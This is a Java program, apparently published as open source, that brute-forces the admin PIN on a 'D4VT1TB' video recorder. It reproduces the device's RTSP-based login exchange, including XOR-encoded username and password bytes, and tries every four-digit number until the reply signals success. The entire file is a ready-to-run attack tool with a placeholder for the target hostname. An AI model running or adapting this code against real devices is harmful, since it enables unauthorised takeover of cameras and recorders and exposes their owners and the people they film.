/**
 * Copyright 2018 Iron City Software LLC
 *
 * This is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this.  If not, see <http://www.gnu.org/licenses/>.
 */

package speco;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.util.HashMap;
import java.util.Map;

import com.google.common.base.Preconditions;
import com.google.common.io.ByteStreams;

/**
 * Brute force admin password attach on D4VT1TB.
 * Probably works on other units.
 * Tries all four digit numbers.
 */
public class Hack {
  public static void main(String args[]) throws Exception {
    new Hack().run();
  }

  private static final String HOSTNAME = "enter-your-hostname-here";
  private final InetAddress HOST;
  private static final int PORT = 5445;
  private static final String USER = "admin"; // Must be 5 characters.

  private static final byte[] USER_XOR_PATTERN = {
    (byte) 0xe1,
    (byte) 0x1f,
    (byte) 0xf0,
    (byte) 0xe7,
    (byte) 0xee,
  };

  private static final byte[] PASS_XOR_PATTERN = {
    (byte) 0x67,
    (byte) 0x99,
    (byte) 0xa8,
    (byte) 0xaa
  };

  int sequence = 0x1e;

  public Hack() throws Exception {
    HOST = InetAddress.getByName(HOSTNAME);
  }

  public void run() throws Exception {
    for (int i = 0; i <= 9999; ++i) {
      Thread.sleep(500);  // may not be necessary.
      String password = String.format("%04d", i);
      if (attempt(USER, password)) {
        System.out.println("\nThe password is " + password);
        return;
      } else {
        System.out.println(password + " tried and failed");
      }
    }
  }

  private boolean attempt(String user, String password) {
    while (true) {
      try {
        return attemptInternal(user, password);
      } catch (Exception e) {
        System.out.println("Retrying due to " + e.getMessage());
      }
    }
  }

  private boolean attemptInternal(String user, String password) throws Exception {
    Socket socket = new Socket(HOST, PORT);
    OutputStream output = socket.getOutputStream();
    InputStream input = socket.getInputStream();
    int sessionId = setupRequest(output, input);

    ByteArrayOutputStream req = new ByteArrayOutputStream();
    req.write(
        "GET_PARAMETER rtsp://111.111.111.111/Live/Channel=0 RTSP/1.0\r\n".getBytes());
    req.write("CSeq: 20637\r\n".getBytes());
    req.write("Content-type: text/parameters\r\n".getBytes());
    req.write(
        String.format("Session: %d;timeout=60\r\n", sessionId).getBytes());
    req.write("Content-length: 60\r\n".getBytes());
    req.write("\r\n".getBytes());
    req.write(new byte[] { 0x55, 0x4d, 0x53, 0x43, 0x3c, 0x00, 0x00, 0x00 });
    req.write(new byte[] { 0x10, 0x02, 0x14, 0x00 });

    // some kind of sequence byte
    req.write(new byte[] { (byte) (sequence % 255) });
    sequence += 2;

    req.write(new byte[] { 0x63, 0x24, 0x4e });

    // username
    req.write(xorCharsWithPattern(user, USER_XOR_PATTERN));

    req.write(PASS_XOR_PATTERN);
    req.write(new byte[] { (byte) 0xbe, 0x5e, 0x48, 0x02, (byte) 0x98, 0x4e });
    req.write(USER_XOR_PATTERN);

    // password
    req.write(xorCharsWithPattern(password, PASS_XOR_PATTERN));

    req.write(new byte[] { (byte) 0xbe, 0x5e, 0x48, 0x02, (byte) 0x98, 0x4e });
    req.write(USER_XOR_PATTERN);

    req.write(new byte[] { 0x67, (byte) 0x99, (byte) 0xa8, (byte) 0xaa,
        (byte) 0xbe, 0x5e, 0x48, 0x02, (byte) 0x88 });

    byte outputArray[] = req.toByteArray();
    // String outputAscii = BaseEncoding.base16().encode(outputArray);
    // System.out.println(outputArray.length);
    // System.out.println(outputAscii);

    output.write(outputArray);
    socket.shutdownOutput();

    byte response[] = ByteStreams.toByteArray(input);
    int key = response.length - 1;
    key -= 16;
    key -= 16;
    // String ascii = BaseEncoding.base16().encode(response);
    // System.out.println(ascii);
    Preconditions.checkState(response[key] == (byte) 0x4e);
    if (response[key + 1] == (byte) 0xe1) {
      return true;
    } else {
      return false;
    }
  }

  private int setupRequest(OutputStream output, InputStream input) throws Exception {
    String request = "SETUP rtsp:/111.111.111.111:5445/rtsp://" + HOSTNAME
        + "/video RTSP/1.0\r\n"
        + "CSeq: 20635\r\n"
        + "Transport: RTP/AVP/TCP;unicast;interleaved=0-1\r\n"
        + "User-Agent: UMS-RTSP-AtiveX Ver1.7.3.5\r\n"
        + "\r\n";
    output.write(request.getBytes());
    int expectedLength = 160 - 4;
    byte response[] = new byte[expectedLength];
    Preconditions.checkState(expectedLength == input.read(response));
    String responseText = new String(response);
    // System.out.println("Response is " + responseText);
    int index = responseText.indexOf("Session: ");
    Preconditions.checkState(index > -1);
    String fragment = responseText.substring(index + "Session: ".length());
    index = fragment.indexOf(";");
    Preconditions.checkState(index > -1);
    String sessionIdText = fragment.substring(0, index);
    // System.out.println("Session id is [" + sessionIdText + "]");
    return Integer.parseInt(sessionIdText);
  }

  // XORs the characters in String str with the bytes from the pattern.
  private static byte[] xorCharsWithPattern(String str, byte[] pattern) {
    Preconditions.checkState(str.length() == pattern.length);
    char[] chars = str.toCharArray();
    byte[] result = new byte[chars.length];
    for (int i = 0; i < chars.length; i++) {
      result[i] = (byte) (chars[i] ^ pattern[i]);
    }
    return result;
  }

}
